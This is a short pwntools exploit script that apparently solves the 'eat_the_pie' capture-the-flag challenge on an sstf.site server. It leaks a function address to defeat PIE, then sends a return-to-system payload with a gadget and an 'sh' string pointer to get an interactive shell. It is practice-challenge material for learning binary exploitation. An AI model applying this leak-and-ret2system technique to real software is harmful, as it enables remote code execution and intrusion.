from pwn import *

#offsets with stack-protector-all
func1_offset = 0x74d
system_plt = 0x5a0
pppr_offset = 0x00000a99		# pop esi ; pop edi ; pop ebp ; ret
sh_offset = 0x316 + 4			# 'sh' of 'fflush'

if __debug__:
	r = process("./eat_the_pie")
else:
	r = remote("eat-the-pie.sstf.site", 1337)

payload = "48aaaaaaaaaabbb"

r.sendlineafter(" > ", payload)
r.recvline()
m = r.recvline().strip()
print m.encode("hex")

print len(m[16:20])
func1_addr = u32(m[:4])

bin_base = func1_addr - func1_offset
system_addr = bin_base + system_plt

print hex(func1_addr), hex(bin_base)

payload = "-2aa" + p32(system_addr) + p32(bin_base + pppr_offset) + p32(bin_base + sh_offset)

#with open("payload", "wb") as f:
#	f.write(payload)

print r.sendafter(" > ", payload)

r.interactive()
